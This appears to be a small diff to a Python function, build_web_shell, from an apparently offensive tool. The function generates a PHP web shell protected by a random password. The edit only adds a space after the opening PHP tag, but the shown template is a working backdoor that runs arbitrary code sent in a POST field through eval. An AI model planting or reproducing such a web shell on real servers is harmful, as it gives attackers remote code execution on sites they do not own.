@@ -112,7 +112,7 @@ def build_web_shell(lang='php') -> tuple:
     flag = build_random_str(32)
     if lang == 'php':
         code = (
-            '<?php'
+            '<?php '
             'if(isset($_POST["{password}"])){{'
             '    @eval($_POST["{password}"]);'
             '}}else{{'
